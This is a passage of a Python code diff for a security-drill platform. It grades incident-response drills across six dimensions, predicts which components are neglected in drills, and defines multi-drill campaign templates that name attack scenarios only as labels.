+        Args:
+            drill: A Drill dataclass instance.
+
+        Returns:
+            Dict suitable for API response or storage.
+        """
+        report = self.grade_drill(drill)
+        return {
+            "drill_id": report.drill_id,
+            "org_id": report.org_id,
+            "scenario_name": report.scenario_name,
+            "component": report.component,
+            "graded_at": report.graded_at,
+            "overall_score": report.overall_score,
+            "overall_grade": report.overall_grade,
+            "percentile_estimate": report.percentile_estimate,
+            "summary": report.summary,
+            "dimensions": {
+                "detection_speed": self._dim_to_dict(report.detection_speed),
+                "triage_accuracy": self._dim_to_dict(report.triage_accuracy),
+                "remediation_speed": self._dim_to_dict(report.remediation_speed),
+                "communication": self._dim_to_dict(report.communication),
+                "documentation_quality": self._dim_to_dict(report.documentation_quality),
+                "post_incident_review": self._dim_to_dict(report.post_incident_review),
+            },
+            "strengths": report.strengths,
+            "improvement_areas": report.improvement_areas,
+            "next_drill_suggestions": report.next_drill_suggestions,
+            "industry_benchmarks": self.INDUSTRY_BENCHMARKS,
+        }
+
+    # ------------------------------------------------------------------
+    # Dimension graders (private)
+    # ------------------------------------------------------------------
+
+    def _grade_detection_speed(
+        self, minutes: Optional[int], severity: str
+    ) -> GradingDimension:
+        """Grade how quickly the synthetic finding was detected."""
+        sla = self._DETECTION_SLA.get(severity, 60)
+        benchmark = self.INDUSTRY_BENCHMARKS["detection_speed"]
+
+        if minutes is None:
+            score = 0.0
+            rubric = "Finding was never detected during drill window."
+            recs = [
+                "Implement alert rules for synthetic findings",
+                "Ensure monitoring covers this component",
+                "Run detection tooling health check",
+            ]
+        elif minutes <= sla * 0.5:
+            score = 10.0
+            rubric = (
+                f"Exceptional: detected in {minutes}m vs SLA of {sla}m "
+                f"(≤50% of target — elite performance)."
+            )
+            recs = ["Maintain current monitoring cadence"]
+        elif minutes <= sla:
+            pct = minutes / sla
+            score = round(10.0 - (pct * 2.5), 1)
+            rubric = (
+                f"Within SLA: detected in {minutes}m vs target {sla}m "
+                f"({pct*100:.0f}% of SLA consumed)."
+            )
+            recs = ["Consider reducing alert thresholds for faster triggering"]
+        else:
+            overrun = minutes / sla
+            score = max(0.0, round(7.5 - (overrun - 1) * 3.0, 1))
+            rubric = (
+                f"SLA breached: detected in {minutes}m vs target {sla}m "
+                f"({overrun:.1f}x SLA — needs improvement)."
+            )
+            recs = [
+                "Add real-time alerting for this vulnerability class",
+                f"Set SIEM correlation rule targeting {severity} findings",
+                "Review monitoring coverage gap for this component",
+            ]
+
+        return GradingDimension(
+            name="detection_speed",
+            score=min(10.0, max(0.0, score)),
+            benchmark=benchmark,
+            delta_vs_benchmark=round(score - benchmark, 2),
+            grade_letter=self._score_to_letter(score),
+            rubric_details=rubric,
+            recommendations=recs,
+        )
+
+    def _grade_triage_accuracy(
+        self, drill: Any, triage_minutes: Optional[int], severity: str
+    ) -> GradingDimension:
+        """Grade triage classification accuracy and speed."""
+        benchmark = self.INDUSTRY_BENCHMARKS["triage_accuracy"]
+        sla = self._TRIAGE_SLA.get(severity, 45)
+        score = 5.0
+        rubric_parts = []
+        recs: List[str] = []
+
+        # Check classification accuracy
+        expected = getattr(drill, "severity", None)
+        actual_tc = getattr(drill, "triage_classification", None)
+
+        if actual_tc is not None:
+            actual_val = actual_tc.value if hasattr(actual_tc, "value") else str(actual_tc)
+            expected_val = expected.value if hasattr(expected, "value") else str(expected)
+            # Normalize: triage_classification might be "critical_confirmed" etc.
+            if expected_val.lower() in actual_val.lower():
+                score += 3.0
+                rubric_parts.append(f"Correct classification: {actual_val}")
+            else:
+                score -= 1.0
+                rubric_parts.append(
+                    f"Misclassification: got '{actual_val}', expected '{expected_val}'"
+                )
+                recs.append(
+                    f"Review {expected_val} severity indicators for this scenario class"
+                )
+        else:
+            score -= 2.0
+            rubric_parts.append("No triage classification recorded")
+            recs.append("Ensure triage classification is logged on every drill")
+
+        # Check triage speed
+        if triage_minutes is not None:
+            if triage_minutes <= sla:
+                score += 2.0
+                rubric_parts.append(
+                    f"Triage speed: {triage_minutes}m (within {sla}m SLA)"
+                )
+            else:
+                rubric_parts.append(
+                    f"Triage speed: {triage_minutes}m (exceeded {sla}m SLA)"
+                )
+                recs.append("Implement escalation triggers to speed triage")
+
+        # Escalation check
+        if getattr(drill, "escalated", False) and severity in ("critical", "high"):
+            score += 1.0
+            rubric_parts.append("Correctly escalated to senior team")
+        elif not getattr(drill, "escalated", False) and severity == "critical":
+            score -= 1.0
+            rubric_parts.append("Critical finding not escalated — escalation required")
+            recs.append("Define escalation matrix for critical-severity findings")
+
+        score = min(10.0, max(0.0, score))
+        return GradingDimension(
+            name="triage_accuracy",
+            score=score,
+            benchmark=benchmark,
+            delta_vs_benchmark=round(score - benchmark, 2),
+            grade_letter=self._score_to_letter(score),
+            rubric_details="; ".join(rubric_parts),
+            recommendations=recs,
+        )
+
+    def _grade_remediation_speed(
+        self, minutes: Optional[int], severity: str
+    ) -> GradingDimension:
+        """Grade remediation speed against severity SLA."""
+        sla = self._REMEDIATION_SLA.get(severity, 720)
+        benchmark = self.INDUSTRY_BENCHMARKS["remediation_speed"]
+
+        if minutes is None:
+            score = 0.0
+            rubric = "Remediation not completed during drill window."
+            recs = [
+                "Define runbooks with step-by-step fix procedures",
+                "Ensure team has write access to affected components",
+                "Set remediation SLA timers in incident tracker",
+            ]
+        elif minutes <= sla * 0.5:
+            score = 10.0
+            rubric = f"Exceptional remediation: {minutes}m vs SLA {sla}m (50%)"
+            recs = ["Document fast-path remediation procedure as standard runbook"]
+        elif minutes <= sla:
+            ratio = minutes / sla
+            score = round(10.0 - ratio * 3.0, 1)
+            rubric = f"Within SLA: remediated in {minutes}m vs {sla}m target"
+            recs = ["Consider pre-approved remediation automation for common fixes"]
+        else:
+            overrun = minutes / sla
+            score = max(0.0, round(6.5 - (overrun - 1) * 2.5, 1))
+            rubric = f"SLA overrun: {minutes}m vs target {sla}m ({overrun:.1f}x)"
+            recs = [
+                "Create pre-approved change requests for common remediations",
+                f"Prepare fix playbook for {severity} findings of this type",
+                "Review approval chain — consider fast-track for known fixes",
+            ]
+
+        return GradingDimension(
+            name="remediation_speed",
+            score=min(10.0, max(0.0, score)),
+            benchmark=benchmark,
+            delta_vs_benchmark=round(score - benchmark, 2),
+            grade_letter=self._score_to_letter(score),
+            rubric_details=rubric,
+            recommendations=recs,
+        )
+
+    def _grade_communication(self, drill: Any) -> GradingDimension:
+        """Grade communication: team notification, escalation, stakeholders."""
+        benchmark = self.INDUSTRY_BENCHMARKS["communication"]
+        score = 4.0
+        rubric_parts = []
+        recs: List[str] = []
+
+        notified = getattr(drill, "notified_teams", []) or []
+        escalated = getattr(drill, "escalated", False)
+        severity = getattr(drill.severity, "value", "medium") if hasattr(drill, "severity") else "medium"
+
+        if notified:
+            score += min(3.0, len(notified) * 1.0)
+            rubric_parts.append(f"Notified {len(notified)} team(s): {', '.join(notified)}")
+        else:
+            score -= 1.0
+            rubric_parts.append("No teams notified")
+            recs.append("Define notification matrix: who to alert per severity level")
+
+        if escalated:
+            score += 1.5
+            rubric_parts.append("Escalation confirmed")
+        elif severity in ("critical", "high"):
+            score -= 0.5
+            rubric_parts.append(f"{severity.title()} finding — escalation expected but not recorded")
+            recs.append(f"Mandate escalation for {severity} findings within triage SLA")
+
+        notes = getattr(drill, "notes", "") or ""
+        if len(notes) >= 200:
+            score += 1.5
+            rubric_parts.append("Detailed communication notes logged")
+        elif len(notes) >= 50:
+            score += 0.5
+            rubric_parts.append("Basic notes present")
+        else:
+            recs.append("Add detailed incident notes during drills (min 200 chars)")
+
+        score = min(10.0, max(0.0, score))
+        return GradingDimension(
+            name="communication",
+            score=score,
+            benchmark=benchmark,
+            delta_vs_benchmark=round(score - benchmark, 2),
+            grade_letter=self._score_to_letter(score),
+            rubric_details="; ".join(rubric_parts) or "No communication data",
+            recommendations=recs,
+        )
+
+    def _grade_documentation_quality(self, drill: Any) -> GradingDimension:
+        """Grade documentation: notes completeness, timeline fidelity."""
+        benchmark = self.INDUSTRY_BENCHMARKS["documentation_quality"]
+        score = 3.0
+        rubric_parts = []
+        recs: List[str] = []
+
+        notes = getattr(drill, "notes", "") or ""
+        tl = drill.timeline
+        events = getattr(tl, "events", []) or []
+
+        # Notes length scoring
+        if len(notes) >= 500:
+            score += 3.5
+            rubric_parts.append("Comprehensive notes (≥500 chars)")
+        elif len(notes) >= 200:
+            score += 2.0
+            rubric_parts.append("Adequate notes (≥200 chars)")
+        elif len(notes) >= 50:
+            score += 0.5
+            rubric_parts.append("Minimal notes (<200 chars)")
+            recs.append("Document root cause analysis in drill notes")
+        else:
+            rubric_parts.append("No meaningful notes recorded")
+            recs.append("Always record notes during and after drills")
+
+        # Timeline event richness
+        if len(events) >= 5:
+            score += 2.0
+            rubric_parts.append(f"Rich event timeline ({len(events)} events)")
+        elif len(events) >= 2:
+            score += 1.0
+            rubric_parts.append(f"Partial event timeline ({len(events)} events)")
+        else:
+            recs.append("Log fine-grained events during drill (detection, analysis, fix steps)")
+
+        # Check for key timestamps
+        ts_fields = ["injected_at", "detected_at", "triaged_at", "remediated_at"]
+        populated = sum(1 for f in ts_fields if getattr(tl, f, None))
+        if populated == 4:
+            score += 1.5
+            rubric_parts.append("All four key timestamps recorded")
+        else:
+            score += populated * 0.3
+            rubric_parts.append(f"Only {populated}/4 key timestamps recorded")
+            recs.append("Record all drill timestamps: detected, triaged, remediated")
+
+        score = min(10.0, max(0.0, score))
+        return GradingDimension(
+            name="documentation_quality",
+            score=score,
+            benchmark=benchmark,
+            delta_vs_benchmark=round(score - benchmark, 2),
+            grade_letter=self._score_to_letter(score),
+            rubric_details="; ".join(rubric_parts) or "No documentation",
+            recommendations=recs,
+        )
+
+    def _grade_post_incident_review(self, drill: Any) -> GradingDimension:
+        """Grade post-incident review completion and quality."""
+        benchmark = self.INDUSTRY_BENCHMARKS["post_incident_review"]
+        notes = getattr(drill, "notes", "") or ""
+        score = 2.0
+        rubric_parts: List[str] = []
+        recs: List[str] = []
+
+        # Check for PIR keywords in notes
+        pir_keywords = [
+            "root cause", "lesson", "action item", "follow-up",
+            "runbook", "post-mortem", "prevented", "improvement",
+        ]
+        found_keywords = [kw for kw in pir_keywords if kw.lower() in notes.lower()]
+        if len(found_keywords) >= 4:
+            score += 5.0
+            rubric_parts.append(
+                f"Strong PIR content: {', '.join(found_keywords[:4])} covered"
+            )
+        elif len(found_keywords) >= 2:
+            score += 2.5
+            rubric_parts.append(f"Partial PIR: {', '.join(found_keywords)} mentioned")
+            recs.append("Expand PIR to cover: root cause, action items, runbook updates")
+        elif len(found_keywords) == 1:
+            score += 1.0
+            rubric_parts.append(f"Minimal PIR: only '{found_keywords[0]}' mentioned")
+            recs.append("Write a structured PIR within 48h of drill completion")
+        else:
+            rubric_parts.append("No PIR content detected in notes")
+            recs.extend([
+                "Conduct PIR within 48h: what worked, what failed, action items",
+                "Update runbooks with insights from this drill",
+                "Share findings with broader security team",
+            ])
+
+        # Check drill status
+        status_val = getattr(drill, "status", None)
+        if status_val:
+            st = status_val.value if hasattr(status_val, "value") else str(status_val)
+            if st == "graded":
+                score += 1.0
+                rubric_parts.append("Drill fully graded (review complete)")
+            elif st == "remediated":
+                score += 0.5
+                rubric_parts.append("Drill remediated but PIR not yet graded")
+                recs.append("Grade the drill to close the PIR loop")
+
+        score = min(10.0, max(0.0, score))
+        return GradingDimension(
+            name="post_incident_review",
+            score=score,
+            benchmark=benchmark,
+            delta_vs_benchmark=round(score - benchmark, 2),
+            grade_letter=self._score_to_letter(score),
+            rubric_details="; ".join(rubric_parts) or "No PIR data",
+            recommendations=recs,
+        )
+
+    # ------------------------------------------------------------------
+    # Utility helpers (private)
+    # ------------------------------------------------------------------
+
+    @staticmethod
+    def _minutes_between(
+        start_iso: Optional[str], end_iso: Optional[str]
+    ) -> Optional[int]:
+        """Compute minutes between two ISO timestamps."""
+        if not start_iso or not end_iso:
+            return None
+        try:
+            start = datetime.fromisoformat(start_iso)
+            end = datetime.fromisoformat(end_iso)
+            if start.tzinfo is None:
+                start = start.replace(tzinfo=timezone.utc)
+            if end.tzinfo is None:
+                end = end.replace(tzinfo=timezone.utc)
+            return max(0, int((end - start).total_seconds() / 60))
+        except (ValueError, TypeError):
+            return None
+
+    @staticmethod
+    def _score_to_letter(score: float) -> str:
+        """Convert numeric score (0-10) to letter grade."""
+        if score >= 9.5:
+            return "A+"
+        elif score >= 9.0:
+            return "A"
+        elif score >= 8.0:
+            return "B+"
+        elif score >= 7.0:
+            return "B"
+        elif score >= 6.0:
+            return "C+"
+        elif score >= 5.0:
+            return "C"
+        elif score >= 4.0:
+            return "D"
+        else:
+            return "F"
+
+    @staticmethod
+    def _estimate_percentile(overall: float) -> float:
+        """Estimate percentile ranking vs industry based on overall score."""
+        # Approximate normal distribution centered at 6.0, std ~1.5
+        z = (overall - 6.0) / 1.5
+        # Approximate CDF using error function
+        import math
+        pct = 50.0 * (1.0 + math.erf(z / math.sqrt(2)))
+        return max(1.0, min(99.0, pct))
+
+    @staticmethod
+    def _dim_to_dict(dim: GradingDimension) -> Dict[str, Any]:
+        """Convert GradingDimension to dict."""
+        return {
+            "name": dim.name,
+            "score": dim.score,
+            "benchmark": dim.benchmark,
+            "delta_vs_benchmark": dim.delta_vs_benchmark,
+            "grade_letter": dim.grade_letter,
+            "rubric_details": dim.rubric_details,
+            "recommendations": dim.recommendations,
+        }
+
+    def _extract_strengths_improvements(
+        self, dims: Dict[str, GradingDimension]
+    ) -> Tuple[List[str], List[str]]:
+        """Extract top 3 strengths and top 3 improvement areas."""
+        sorted_dims = sorted(dims.values(), key=lambda d: d.score, reverse=True)
+        strengths = [
+            f"{d.name.replace('_', ' ').title()}: {d.score:.1f}/10 ({d.grade_letter})"
+            for d in sorted_dims[:3]
+            if d.score >= 6.0
+        ]
+        improvements = [
+            f"{d.name.replace('_', ' ').title()}: {d.score:.1f}/10 — "
+            + (d.recommendations[0] if d.recommendations else "Review performance")
+            for d in sorted_dims[-3:]
+            if d.score < 7.0
+        ]
+        return strengths, improvements
+
+    def _build_summary(
+        self,
+        overall: float,
+        grade: str,
+        dims: Dict[str, GradingDimension],
+        severity: str,
+    ) -> str:
+        """Build a human-readable summary paragraph."""
+        best_dim = max(dims.values(), key=lambda d: d.score)
+        worst_dim = min(dims.values(), key=lambda d: d.score)
+        return (
+            f"Overall grade {grade} ({overall:.1f}/10) for this {severity}-severity drill. "
+            f"Strongest dimension: {best_dim.name.replace('_',' ')} ({best_dim.score:.1f}). "
+            f"Focus area: {worst_dim.name.replace('_',' ')} ({worst_dim.score:.1f}). "
+            f"Team is performing at approximately the "
+            f"{AutoGrader._estimate_percentile(overall):.0f}th percentile "
+            f"vs industry peers."
+        )
+
+    def _suggest_next_drills(
+        self, dims: Dict[str, GradingDimension], current_scenario: str
+    ) -> List[str]:
+        """Suggest next drills based on weak dimensions."""
+        suggestions: List[str] = []
+        if dims["detection_speed"].score < 6.0:
+            suggestions.append(
+                "Run a stealth injection drill to practice passive detection"
+            )
+        if dims["triage_accuracy"].score < 6.0:
+            suggestions.append(
+                "Run severity classification training with mixed-severity scenarios"
+            )
+        if dims["remediation_speed"].score < 6.0:
+            suggestions.append(
+                "Conduct a time-boxed remediation sprint drill with pre-staged fix"
+            )
+        if dims["communication"].score < 6.0:
+            suggestions.append(
+                "Run a communication-focused drill testing notification workflows"
+            )
+        if dims["documentation_quality"].score < 5.0:
+            suggestions.append(
+                "Practice structured incident documentation with templates"
+            )
+        if dims["post_incident_review"].score < 5.0:
+            suggestions.append(
+                "Schedule a facilitated PIR workshop with the FAIL Engine team"
+            )
+        if not suggestions:
+            suggestions.append(
+                f"Advance to a higher-complexity variant of '{current_scenario}'"
+            )
+        return suggestions[:4]
+
+
+# ---------------------------------------------------------------------------
+# NEGLECT ZONE PREDICTOR
+# ---------------------------------------------------------------------------
+
+
+@dataclass
+class ComponentRiskProfile:
+    """Risk profile for a single component."""
+
+    component_id: str
+    component_name: str
+    neglect_risk_score: float         # 0.0 (low) – 10.0 (critical neglect risk)
+    risk_level: str                   # low / medium / high / critical
+    days_since_last_drill: int
+    historical_avg_score: float
+    contributing_factors: Dict[str, float]   # factor_name → contribution
+    recommendation: str
+    estimated_days_until_critical: Optional[int]
+
+
+class NeglectZonePredictor:
+    """ML-inspired predictor for component neglect risk.
+
+    Identifies which components are most likely to be overlooked in security
+    drills and become 'neglect zones' — areas where team readiness degrades
+    silently over time.
+
+    Factors considered:
+    - Days since last drill (recency)
+    - Team size (smaller teams → higher neglect risk per component)
+    - Component criticality (blast radius)
+    - Change velocity (high churn → changing attack surface)
+    - Historical drill scores (poor past performance)
+    - Number of past drills (low coverage)
+
+    Uses a weighted scoring model calibrated against security team behavior
+    observed across enterprise deployments.
+
+    Usage::
+
+        predictor = NeglectZonePredictor()
+        risks = predictor.predict_neglect_risk(component_profiles)
+        suggestions = predictor.suggest_next_drills(risks, n=5)
+    """
+
+    # Feature weights for neglect risk score
+    _FEATURE_WEIGHTS = {
+        "recency_score": 0.35,          # Days since last drill (highest weight)
+        "criticality_score": 0.20,      # Component criticality level
+        "performance_score": 0.20,      # Historical average drill score (inverse)
+        "change_velocity_score": 0.15,  # Rate of code/config changes
+        "coverage_score": 0.10,         # Number of historical drills (inverse)
+    }
+
+    # Risk level thresholds
+    _RISK_LEVELS = [
+        (8.0, "critical"),
+        (6.0, "high"),
+        (4.0, "medium"),
+        (0.0, "low"),
+    ]
+
+    # Days-to-critical projection slope per risk level
+    _DECAY_RATE_PER_LEVEL = {
+        "critical": 0.15,
+        "high": 0.08,
+        "medium": 0.04,
+        "low": 0.01,
+    }
+
+    def predict_neglect_risk(
+        self,
+        component_profiles: List[Dict[str, Any]],
+    ) -> List[ComponentRiskProfile]:
+        """Compute neglect risk scores for all provided components.
+
+        Args:
+            component_profiles: List of dicts, each with:
+                - component_id (str)
+                - component_name (str)
+                - last_drill_date (str, ISO format or None)
+                - team_size (int, default 5)
+                - component_criticality (float 0-10, default 5.0)
+                - change_velocity (float 0-10, default 3.0)
+                - historical_scores (list of float, last N drill scores)
+                - drill_count (int, total number of drills run)
+
+        Returns:
+            Sorted list of ComponentRiskProfile (highest risk first).
+        """
+        profiles: List[ComponentRiskProfile] = []
+
+        for cp in component_profiles:
+            comp_id = cp.get("component_id", str(uuid.uuid4()))
+            comp_name = cp.get("component_name", comp_id)
+
+            # --- Feature extraction ---
+            days_since = self._compute_days_since_drill(cp.get("last_drill_date"))
+            recency_score = self._recency_to_score(days_since)
+
+            criticality = float(cp.get("component_criticality", 5.0))
+            criticality_score = min(10.0, criticality)
+
+            hist_scores = cp.get("historical_scores", [])
+            if hist_scores:
+                avg_score = statistics.mean(hist_scores)
+                # Inverse: low score → high neglect risk
+                perf_score = 10.0 - min(10.0, avg_score)
+            else:
+                avg_score = 0.0
+                perf_score = 8.0  # No data → assume underperforming
+
+            change_vel = float(cp.get("change_velocity", 3.0))
+            change_score = min(10.0, change_vel)
+
+            drill_count = int(cp.get("drill_count", 0))
+            # Low drill count → high neglect
+            coverage_score = max(0.0, 10.0 - min(10.0, drill_count * 1.5))
+
+            # Team size factor: small teams have less bandwidth
+            team_size = max(1, int(cp.get("team_size", 5)))
+            team_factor = max(0.5, min(1.5, 6.0 / team_size))
+
+            # --- Weighted risk score ---
+            contributing: Dict[str, float] = {
+                "recency_score": recency_score * self._FEATURE_WEIGHTS["recency_score"],
+                "criticality_score": criticality_score * self._FEATURE_WEIGHTS["criticality_score"],
+                "performance_score": perf_score * self._FEATURE_WEIGHTS["performance_score"],
+                "change_velocity_score": change_score * self._FEATURE_WEIGHTS["change_velocity_score"],
+                "coverage_score": coverage_score * self._FEATURE_WEIGHTS["coverage_score"],
+            }
+            raw_risk = sum(contributing.values()) * team_factor
+            risk_score = round(min(10.0, max(0.0, raw_risk)), 2)
+            risk_level = self._score_to_risk_level(risk_score)
+
+            # --- Project days until critical ---
+            days_to_crit = self._project_days_to_critical(
+                risk_score, risk_level, days_since
+            )
+
+            # --- Recommendation ---
+            rec = self._build_recommendation(
+                risk_level, days_since, perf_score, change_score, comp_name
+            )
+
+            profiles.append(ComponentRiskProfile(
+                component_id=comp_id,
+                component_name=comp_name,
+                neglect_risk_score=risk_score,
+                risk_level=risk_level,
+                days_since_last_drill=days_since,
+                historical_avg_score=round(avg_score, 2),
+                contributing_factors=contributing,
+                recommendation=rec,
+                estimated_days_until_critical=days_to_crit,
+            ))
+
+        profiles.sort(key=lambda p: p.neglect_risk_score, reverse=True)
+        return profiles
+
+    def suggest_next_drills(
+        self,
+        risk_profiles: List[ComponentRiskProfile],
+        n: int = 5,
+        scenario_library: Optional["ScenarioLibrary"] = None,
+    ) -> List[Dict[str, Any]]:
+        """Return prioritized drill suggestions based on neglect risk.
+
+        Args:
+            risk_profiles: Output from predict_neglect_risk().
+            n: Number of drill suggestions to return.
+            scenario_library: Optional ScenarioLibrary for scenario pairing.
+
+        Returns:
+            List of suggestion dicts with component, scenario, priority, rationale.
+        """
+        lib = scenario_library or ScenarioLibrary()
+        suggestions: List[Dict[str, Any]] = []
+
+        for profile in risk_profiles[:n]:
+            # Match scenario to risk level
+            min_sev = "critical" if profile.risk_level in ("critical", "high") else "medium"
+            try:
+                scenario = lib.random_scenario(min_severity=min_sev)
+            except ValueError:
+                scenario = lib.random_scenario(min_severity="low")
+
+            suggestions.append({
+                "priority": len(suggestions) + 1,
+                "component_id": profile.component_id,
+                "component_name": profile.component_name,
+                "neglect_risk_score": profile.neglect_risk_score,
+                "risk_level": profile.risk_level,
+                "suggested_scenario": scenario.name,
+                "scenario_display_name": scenario.display_name,
+                "scenario_severity": scenario.severity,
+                "rationale": profile.recommendation,
+                "days_since_last_drill": profile.days_since_last_drill,
+                "estimated_days_to_critical": profile.estimated_days_until_critical,
+            })
+
+        return suggestions
+
+    def get_neglect_zones(
+        self,
+        risk_profiles: List[ComponentRiskProfile],
+        threshold: float = 7.0,
+    ) -> List[ComponentRiskProfile]:
+        """Return components that have crossed the neglect zone threshold.
+
+        Args:
+            risk_profiles: Output from predict_neglect_risk().
+            threshold: Risk score above which a component is a neglect zone.
+
+        Returns:
+            List of ComponentRiskProfile with risk_score >= threshold.
+        """
+        return [p for p in risk_profiles if p.neglect_risk_score >= threshold]
+
+    # ------------------------------------------------------------------
+    # Helpers (private)
+    # ------------------------------------------------------------------
+
+    @staticmethod
+    def _compute_days_since_drill(last_drill_date: Optional[str]) -> int:
+        """Return days since the last drill, or 999 if never drilled."""
+        if not last_drill_date:
+            return 999
+        try:
+            last = datetime.fromisoformat(last_drill_date)
+            if last.tzinfo is None:
+                last = last.replace(tzinfo=timezone.utc)
+            now = datetime.now(timezone.utc)
+            return max(0, (now - last).days)
+        except (ValueError, TypeError):
+            return 999
+
+    @staticmethod
+    def _recency_to_score(days: int) -> float:
+        """Convert days since last drill to neglect risk score (0-10)."""
+        if days >= 365:
+            return 10.0
+        elif days >= 180:
+            return 8.5
+        elif days >= 90:
+            return 6.5
+        elif days >= 60:
+            return 4.5
+        elif days >= 30:
+            return 2.5
+        else:
+            return 1.0
+
+    def _score_to_risk_level(self, score: float) -> str:
+        """Map numeric risk score to risk level string."""
+        for threshold, level in self._RISK_LEVELS:
+            if score >= threshold:
+                return level
+        return "low"
+
+    def _project_days_to_critical(
+        self, risk_score: float, risk_level: str, days_since: int
+    ) -> Optional[int]:
+        """Estimate days until component reaches critical neglect."""
+        if risk_level == "critical":
+            return 0
+        decay = self._DECAY_RATE_PER_LEVEL.get(risk_level, 0.05)
+        gap_to_critical = max(0.0, 8.0 - risk_score)
+        if decay <= 0:
+            return None
+        return max(0, int(gap_to_critical / decay))
+
+    @staticmethod
+    def _build_recommendation(
+        risk_level: str,
+        days_since: int,
+        perf_score: float,
+        change_score: float,
+        comp_name: str,
+    ) -> str:
+        """Build human-readable recommendation string."""
+        urgency = {
+            "critical": "IMMEDIATE",
+            "high": "URGENT",
+            "medium": "Schedule within 2 weeks",
+            "low": "Include in next quarterly rotation",
+        }.get(risk_level, "Review")
+
+        reasons: List[str] = []
+        if days_since >= 90:
+            reasons.append(f"no drill in {days_since} days")
+        if perf_score >= 6.0:
+            reasons.append("historically low drill scores")
+        if change_score >= 7.0:
+            reasons.append("high change velocity increasing attack surface")
+
+        reason_str = f" ({'; '.join(reasons)})" if reasons else ""
+        return f"{urgency}: Schedule drill for '{comp_name}'{reason_str}."
+
+
+# ---------------------------------------------------------------------------
+# CHAOS CAMPAIGN MANAGER
+# ---------------------------------------------------------------------------
+
+
+@dataclass
+class CampaignDrill:
+    """A single drill entry within a chaos campaign."""
+
+    drill_id: str
+    scenario_name: str
+    target_component: str
+    scheduled_date: str
+    status: str               # pending / active / completed / skipped
+    score: Optional[float] = None
+    grade: Optional[str] = None
+    notes: str = ""
+
+
+@dataclass
+class Campaign:
+    """A multi-drill chaos campaign."""
+
+    campaign_id: str
+    name: str
+    description: str
+    template: str
+    org_id: str
+    start_date: str
+    end_date: str
+    status: str                  # planning / active / completed / paused
+    drills: List[CampaignDrill] = field(default_factory=list)
+    created_at: str = ""
+    completed_at: Optional[str] = None
+
+    # Aggregate metrics (populated after drills complete)
+    aggregate_score: float = 0.0
+    score_trend: str = ""         # improving / declining / stable
+    completion_rate: float = 0.0  # 0.0-1.0
+
+
+class ChaosCampaignManager:
+    """Multi-drill chaos campaign orchestration.
+
+    Manages coordinated attack simulation campaigns spanning days or weeks.
+    Provides templates for common security readiness scenarios, tracks
+    progress, and generates trend analysis across the campaign lifecycle.
+
+    Built-in campaign templates:
+    - **week_of_fire**: Daily drills Mon–Fri, escalating severity
+    - **quarterly_assessment**: 12-drill quarterly readiness assessment
+    - **new_team_onboarding**: Graduated onboarding campaign for new teams
+    - **red_team_simulation**: Advanced adversarial simulation (week-long)
+    - **compliance_audit_prep**: Pre-audit readiness across all controls
+
+    Usage::
+
+        mgr = ChaosCampaignManager()
+        campaign = mgr.create_campaign(
+            template="week_of_fire",
+            org_id="org-123",
+            target_components=["auth-service", "payment-api"],
+        )
+        mgr.record_drill_result(campaign.campaign_id, drill_id, score=8.2)
+        summary = mgr.get_campaign_summary(campaign.campaign_id)
+    """
+
+    # Campaign template definitions
+    _TEMPLATES: Dict[str, Dict[str, Any]] = {
+        "week_of_fire": {
+            "name": "Week of Fire",
+            "description": (
+                "5 consecutive daily drills (Mon–Fri) with escalating severity. "
+                "Designed to stress-test team readiness under sustained pressure."
+            ),
+            "duration_days": 5,
+            "drill_count": 5,
+            "severity_progression": ["medium", "medium", "high", "high", "critical"],
+            "scenarios": [
+                "ssrf", "sqli", "command_injection", "deserialization", "log4shell"
+            ],
+            "goal": "Measure team response under sustained daily threat pressure",
+        },
+        "quarterly_assessment": {
+            "name": "Quarterly Security Assessment",
+            "description": (
+                "12-drill assessment spread over 13 weeks. Covers all major attack "
+                "categories and provides a comprehensive readiness benchmark."
+            ),
+            "duration_days": 91,
+            "drill_count": 12,
+            "severity_progression": [
+                "medium", "high", "medium", "critical", "high",
+                "medium", "high", "critical", "medium", "high", "high", "critical"
+            ],
+            "scenarios": [
+                "sqli", "ssrf", "log4shell", "api_key_leak", "s3_bucket_exposure",
+                "xxe", "idor", "jwt_bypass", "k8s_escape", "supply_chain",
+                "race_condition", "deserialization"
+            ],
+            "goal": "Comprehensive quarterly readiness assessment across all attack categories",
+        },
+        "new_team_onboarding": {
+            "name": "New Team Onboarding",
+            "description": (
+                "Graduated 4-week onboarding campaign for teams new to FAIL Engine. "
+                "Starts with low-severity drills and progressively increases complexity."
+            ),
+            "duration_days": 28,
+            "drill_count": 8,
+            "severity_progression": [
+                "low", "low", "medium", "medium", "medium", "high", "high", "critical"
+            ],
+            "scenarios": [
+                "path_traversal", "idor", "ssrf", "sqli",
+                "jwt_bypass", "command_injection", "deserialization", "log4shell"
+            ],
+            "goal": "Build team familiarity with drill process and response procedures",
+        },
+        "red_team_simulation": {
+            "name": "Red Team Simulation",
+            "description": (
+                "Advanced 7-day red team simulation with realistic attack chains. "
+                "Each day targets a different layer: web, auth, cloud, supply chain."
+            ),
+            "duration_days": 7,
+            "drill_count": 7,
+            "severity_progression": [
+                "high", "critical", "high", "critical", "high", "critical", "critical"
+            ],
+            "scenarios": [
+                "ssrf", "log4shell", "jwt_bypass", "k8s_escape",
+                "supply_chain", "dependency_confusion", "deserialization"
+            ],
+            "goal": "Simulate realistic multi-stage attack chain across infrastructure layers",
+        },
+        "compliance_audit_prep": {
+            "name": "Compliance Audit Prep",
+            "description": (
+                "10-drill campaign targeting controls assessed during SOC2/FedRAMP audits. "
+                "Ensures evidence is available for each key control area."
+            ),
+            "duration_days": 30,
+            "drill_count": 10,
+            "severity_progression": [
+                "high", "medium", "high", "medium", "critical",
+                "medium", "high", "medium", "high", "critical"
+            ],
+            "scenarios": [
+                "api_key_leak", "s3_bucket_exposure", "sqli", "idor", "jwt_bypass",
+                "xxe", "path_traversal", "command_injection", "ssrf", "log4shell"
+            ],
+            "goal": "Generate audit-ready evidence for compliance control coverage",
+        },
+    }
+
+    def __init__(self) -> None:
+        self._campaigns: Dict[str, Campaign] = {}
+        self._scenario_library = ScenarioLibrary()
+
+    # ------------------------------------------------------------------
+    # Campaign lifecycle
+    # ------------------------------------------------------------------
+
+    def create_campaign(
+        self,
+        template: str,
+        org_id: str,
+        target_components: List[str],
+        start_date: Optional[str] = None,
+        custom_name: Optional[str] = None,
+    ) -> Campaign:
+        """Create a new chaos campaign from a template.
+
+        Args:
+            template: Template name (see _TEMPLATES keys).
+            org_id: Organization ID.
+            target_components: Components to include in the campaign.
+            start_date: ISO start date (defaults to today).
+            custom_name: Override template name.
+
+        Returns:
+            Campaign instance ready for execution.
+
+        Raises:
+            ValueError: If template name is not recognized.
+        """
+        if template not in self._TEMPLATES:
